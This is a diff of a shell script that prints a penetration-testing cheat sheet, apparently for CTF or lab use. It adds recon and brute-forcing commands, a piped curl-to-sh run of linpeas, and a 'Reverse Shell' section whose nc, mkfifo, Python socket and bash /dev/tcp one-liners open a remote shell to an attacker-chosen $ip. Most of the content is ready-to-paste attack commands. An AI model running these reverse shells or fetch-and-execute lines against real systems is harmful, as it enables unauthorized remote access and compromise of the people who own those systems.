@@ -20,7 +20,7 @@ Header() {
 	echo ' | ▓▓__| ▓▓|      \ /       \ ▓▓  /  \ ▓▓___\▓▓ ▓▓    \ /      \ /      \|   ▓▓ \  '
 	echo ' | ▓▓    ▓▓ \▓▓▓▓▓▓\  ▓▓▓▓▓▓▓ ▓▓_/  ▓▓\▓▓    \| ▓▓▓▓▓▓▓\  ▓▓▓▓▓▓\  ▓▓▓▓▓▓\\▓▓▓▓▓▓  '
 	echo ' | ▓▓▓▓▓▓▓▓/      ▓▓ ▓▓     | ▓▓   ▓▓ _\▓▓▓▓▓▓\ ▓▓  | ▓▓ ▓▓    ▓▓ ▓▓    ▓▓ | ▓▓ __ '
-	echo ' | ▓▓  | ▓▓  ▓▓▓▓▓▓▓ ▓▓_____| ▓▓▓▓▓▓\|  \__| ▓▓ ▓▓  | ▓▓ ▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓ | ▓▓|  \'
+	echo ' | ▓▓  | ▓▓  ▓▓▓▓▓▓▓ ▓▓_____| ▓▓▓▓▓▓\|  \__| ▓▓ ▓▓  | ▓▓ ▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓ | ▓▓|  \ '
 	echo ' | ▓▓  | ▓▓\▓▓    ▓▓\▓▓     \ ▓▓  \▓▓\\▓▓    ▓▓ ▓▓  | ▓▓\▓▓     \\▓▓     \  \▓▓  ▓▓'
 	echo '  \▓▓   \▓▓ \▓▓▓▓▓▓▓ \▓▓▓▓▓▓▓\▓▓   \▓▓ \▓▓▓▓▓▓ \▓▓   \▓▓ \▓▓▓▓▓▓▓ \▓▓▓▓▓▓▓   \▓▓▓▓ '
 	echo '                                                                                   '
@@ -42,25 +42,31 @@ hacksheet() {
 	echo 'https://hashcat.net/wiki/doku.php?id=example_hashes'
 	Title '🐧 Linux'
 	echo 'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh'
+	echo 'curl -sL https://github.com/stealthcopter/deepce/raw/main/deepce.sh -O'
 	Title '🌐 Network'
 	echo "nmap -A $ip"
 	echo "nmap -p- -T4 -v $ip"
 	echo "nmap -A -T4 -sC -sV $ip"
+	echo "nmap -sU -T4 $ip"
+	echo "nmap --script \"default,discovery,exploit,version,vuln\" $ip"
 	Title '📜 Reverse Shell'
 	echo 'nc -lp 4444'
 	echo "nc $ip 4444 -e /bin/bash"
 	echo "mkfifo /tmp/f;nc $ip 4444 0</tmp/f|/bin/sh -i 2>&1|tee /tmp/f"
 	echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+	echo "bash -c 'bash -i >& /dev/tcp/$ip/4444 0>&1'"
 	Title '🪟 Windows'
 	echo 'smbclient -U user -L //ip//'
 	echo 'smbclient -U user //ip//shares'
 	Title '🕸️ Web'
 	echo "ffuf -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt:FUZZ -u http://$url/ -H 'Host: FUZZ.$url'"
 	echo "gobuster dir -u http://$url -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -t 25 -x html,php"
+	echo "feroxbuster -u http://$url -e -x html,js,php"
 	echo 'mysql -h localhost -u myname -p'
 	Title '📖 Wordlist'
 	echo '| Name                      | Path                                                                    |'
 	echo '|---------------------------|-------------------------------------------------------------------------|'
+	echo '| SecLists Raft Medium      | `/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt` |'
 	echo '| Dirbuster Small           | `/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt`           |'
 	echo '| Dirbuster Small Lowercase | `/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt` |'
 	echo '| Dirb                      | `/usr/share/dirb/wordlists/common.txt`                                  |'
